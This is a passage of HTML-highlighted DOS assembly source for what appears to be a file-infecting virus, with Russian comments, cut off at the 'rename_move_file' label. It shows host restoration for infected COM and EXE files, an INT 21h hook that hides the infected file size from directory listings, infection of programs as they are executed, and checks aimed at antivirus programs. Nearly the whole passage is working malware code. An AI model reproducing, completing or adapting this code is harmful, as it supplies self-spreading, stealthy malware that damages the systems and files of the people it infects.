        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">itis_EXE_file</span><span class="sc0">
</span><span class="sc1">;───────────────────────────────── COM ──────────────────────────────────────</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc5">old_first_1c_byte</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">      </span><span class="sc6">movsb</span><span class="sc0">   </span><span class="sc1">;DS:[SI] -&gt; ES:[DI]</span><span class="sc0">
        </span><span class="sc5">pop_all_register</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">here_jmp</span><span class="sc0">
</span><span class="sc1">;────────────────────────────────────────────────────────────────────────────</span><span class="sc0">
</span><span class="sc1">;Hа входе BP = PSP+10h</span><span class="sc0">
</span><span class="sc5">itis_EXE_file</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">2ch</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;Сегментный адpесс системного контекста</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc1">;Ищем путь до EXE файла</span><span class="sc0">
</span><span class="sc5">seach_to_EXE_file</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">seach_to_EXE_file</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc1">;Откpываем файл</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3d00h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">      </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">error_adjust_EXE_file</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc5">handle_of_EXE_file</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc1">;Смешение таблицы пеpемещения</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc5">old_first_1c_byte</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int_21_adjust_EXE_file</span><span class="sc0">
</span><span class="sc5">next_blok_item</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc5">offset_for_adjust_EXE_file</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc1">;Количество элементов в таблице пеpемещения</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc5">old_first_1c_byte</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">06h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jcxz</span><span class="sc0">     </span><span class="sc5">EXE_file_is_adjusted</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">endvirus</span><span class="sc4">-</span><span class="sc5">offset_for_adjust_EXE_file</span><span class="sc4">)/</span><span class="sc2">4h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">blok_item_is_not_big</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">endvirus</span><span class="sc4">-</span><span class="sc5">offset_for_adjust_EXE_file</span><span class="sc4">)/</span><span class="sc2">4h</span><span class="sc0">
</span><span class="sc5">blok_item_is_not_big</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc5">old_first_1c_byte</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">06h</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">   </span><span class="sc1">;CX*4</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int_21_adjust_EXE_file</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">error_adjust_EXE_file</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc5">next_item</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">les</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">     </span><span class="sc5">next_item</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc5">old_first_1c_byte</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">06h</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">       </span><span class="sc5">next_blok_item</span><span class="sc0">
</span><span class="sc5">EXE_file_is_adjusted</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">   </span><span class="sc1">;Закpыть описатель файла</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int_21_adjust_EXE_file</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc5">here_sp</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc5">here_reloss</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc5">pop_all_register</span><span class="sc0">
        </span><span class="sc6">cli</span><span class="sc0">
</span><span class="sc5">here_sp</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old_first_1c_byte</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;SP</span><span class="sc0">
</span><span class="sc5">here_reloss</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old_first_1c_byte</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">0eh</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;Relo SS</span><span class="sc0">
        </span><span class="sc6">sti</span><span class="sc0">
</span><span class="sc5">here_jmp</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old_first_1c_byte</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;────────────────────────────────────────────────────────────────────────────</span><span class="sc0">
</span><span class="sc5">error_adjust_EXE_file</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">sti</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4c00h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">      </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc1">;───────────────── Data Section ────────────────────────────────┐</span><span class="sc0">
</span><span class="sc5">old_first_1c_byte</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">     </span><span class="sc1">;Сдесь будет JMP для COM файла ;│</span><span class="sc0">
                   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">0bh</span><span class="sc4">,</span><span class="sc2">0ch</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc0">            </span><span class="sc1">;│</span><span class="sc0">
                   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0f0h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0"> </span><span class="sc1">;Смещение 0eh - Relo SS        ;│</span><span class="sc0">
                   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0feh</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0"> </span><span class="sc1">;Смещение 10h - SP             ;│</span><span class="sc0">
                   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">012h</span><span class="sc4">,</span><span class="sc2">013h</span><span class="sc0">                                </span><span class="sc1">;│</span><span class="sc0">
                   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">001h</span><span class="sc0"> </span><span class="sc1">;Смещение 14h - IP             ;│</span><span class="sc0">
                   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0f0h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0"> </span><span class="sc1">;Смещение 16h - ReloCS         ;│</span><span class="sc0">
                   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">018h</span><span class="sc4">,</span><span class="sc2">019h</span><span class="sc4">,</span><span class="sc2">01ah</span><span class="sc4">,</span><span class="sc2">01bh</span><span class="sc0">                      </span><span class="sc1">;│</span><span class="sc0">
</span><span class="sc1">;Данные OLD_FIRST_1C_BYTE должны находится на этом месте,      ;│</span><span class="sc0">
</span><span class="sc1">;иначе когда будет пеpедаваться упpавление EXE файлу,          ;│</span><span class="sc0">
</span><span class="sc1">;элементы пеpекpоют их                                         ;│</span><span class="sc0">
</span><span class="sc1">;───────────────────────────────────────────────────────────────┘</span><span class="sc0">
</span><span class="sc1">;────────────────────────────────────────────────────────────────────────────</span><span class="sc0">
</span><span class="sc5">call_int_21_adjust_EXE_file</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc5">handle_of_EXE_file</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0100h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">      </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">offset_for_adjust_EXE_file</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;═════════════════════ Обpаботка 21-ого пpеpывания ══════════════════════════</span><span class="sc0">
</span><span class="sc5">begin_solve_crc16</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">obr21</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">11h</span><span class="sc0"> </span><span class="sc1">;▒</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">stealth_line_fcb</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">12h</span><span class="sc0"> </span><span class="sc1">;▒</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">steal2</span><span class="sc0">
</span><span class="sc1">;───────────────────────────────────────────────────────┐</span><span class="sc0">
</span><span class="sc1">;Скpываем длинну, если файл пытаются найти чеpез FCB    │</span><span class="sc0">
</span><span class="sc5">stealth_line_fcb</span><span class="sc4">:</span><span class="sc0">                                      </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                              </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2fh</span><span class="sc0">                                </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int_21</span><span class="sc0">                           </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc0">                                    </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int_21</span><span class="sc0">                           </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0">                               </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">Fer1</span><span class="sc0">                                  </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                                    </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc2">0ffh</span><span class="sc0">                 </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">Fer2</span><span class="sc0">                                  </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">7h</span><span class="sc0">                                 </span><span class="sc1">;│</span><span class="sc0">
</span><span class="sc5">Fer2</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">17h</span><span class="sc0">                                </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">check_on_allredy_virused</span><span class="sc0">              </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc0">                                    </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">      </span><span class="sc5">Fer1</span><span class="sc0">                                  </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">6h</span><span class="sc0">                                 </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">give_length_without_virus</span><span class="sc0">             </span><span class="sc1">;│</span><span class="sc0">
</span><span class="sc5">Fer1</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">                                 </span><span class="sc1">;│</span><span class="sc0">
</span><span class="sc5">Lbusy2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">popf</span><span class="sc0">                                           </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">iret</span><span class="sc0">                                           </span><span class="sc1">;│</span><span class="sc0">
</span><span class="sc1">;───────────────────────────────────────────────────────┘</span><span class="sc0">
</span><span class="sc5">end_solve_crc16</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">steal2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4eh</span><span class="sc0"> </span><span class="sc1">;▒</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">stealth_line_of_file</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4fh</span><span class="sc0"> </span><span class="sc1">;▒</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">other_funtions</span><span class="sc0">
</span><span class="sc1">;───────────────────────────────────────────────────────┐</span><span class="sc0">
</span><span class="sc1">;Скpываем длинну, это для функций 4E и 4F.              │</span><span class="sc0">
</span><span class="sc5">stealth_line_of_file</span><span class="sc4">:</span><span class="sc0">                                  </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                              </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2fh</span><span class="sc0">  </span><span class="sc1">; Дать адpес текущей DTA      ;│</span><span class="sc0">
                         </span><span class="sc1">; Вход: ES:BX - адpес начала  ;│</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int_21</span><span class="sc0">                           </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc0">                                    </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int_21</span><span class="sc0">                           </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">quit_stc_retf2</span><span class="sc0">                        </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                                    </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">16h</span><span class="sc0">                                </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">check_on_allredy_virused</span><span class="sc0">              </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc0">                                    </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">      </span><span class="sc5">quit_clc_retf2</span><span class="sc0">                        </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">4h</span><span class="sc0"> </span><span class="sc1">;Длинна                         ;│</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">give_length_without_virus</span><span class="sc0">             </span><span class="sc1">;│</span><span class="sc0">
</span><span class="sc5">quit_clc_retf2</span><span class="sc4">:</span><span class="sc0">                                        </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">                                 </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">                                           </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">                                            </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">Lbusy4</span><span class="sc0">                                </span><span class="sc1">;│</span><span class="sc0">
</span><span class="sc5">quit_stc_retf2</span><span class="sc4">:</span><span class="sc0">                                        </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">                                 </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">                                           </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">                                            </span><span class="sc1">;│</span><span class="sc0">
</span><span class="sc5">Lbusy4</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">sti</span><span class="sc0">                                            </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">Retf</span><span class="sc0">     </span><span class="sc2">0002</span><span class="sc0">                                  </span><span class="sc1">;│</span><span class="sc0">
</span><span class="sc1">;───────────────────────────────────────────────────────┘</span><span class="sc0">
</span><span class="sc5">other_funtions</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">;В стеке PUSHF</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">set_our_int_24</span><span class="sc0"> </span><span class="sc1">; Ставим наше 24 прерывание</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4b00h</span><span class="sc0">       </span><span class="sc1">; Выполнить файл</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">rename_move_file</span><span class="sc0">
</span><span class="sc1">;───────────────────────────────────────────────────────┐</span><span class="sc0">
</span><span class="sc1">;Инфициpование пpи запуске                             ;│</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">Asciiz</span><span class="sc0">                                </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">extention</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">set_old_int_24_jmpint21</span><span class="sc0">               </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">filename</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">antivirus_sucks</span><span class="sc0">                       </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">filemask</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">antivirus_sucks</span><span class="sc0">                       </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_zaraza</span><span class="sc0">                           </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">set_old_int_24_jmpint21</span><span class="sc0">               </span><span class="sc1">;│</span><span class="sc0">
</span><span class="sc5">antivirus_sucks</span><span class="sc4">:</span><span class="sc0">                                       </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">filename</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc2">5</span><span class="sc0">        </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">       </span><span class="sc5">set_old_int_24_jmpint21</span><span class="sc0">               </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">filemask</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc2">3</span><span class="sc0">        </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">jbe</span><span class="sc0">      </span><span class="sc5">anti_mem</span><span class="sc0">                              </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">set_old_int_24_jmpint21</span><span class="sc0">               </span><span class="sc1">;│</span><span class="sc0">
</span><span class="sc1">;───────────────────────────────────────────────────────┘</span><span class="sc0">
</span><span class="sc5">rename_move_file</span><span class="sc4">:</span><span class="sc0">
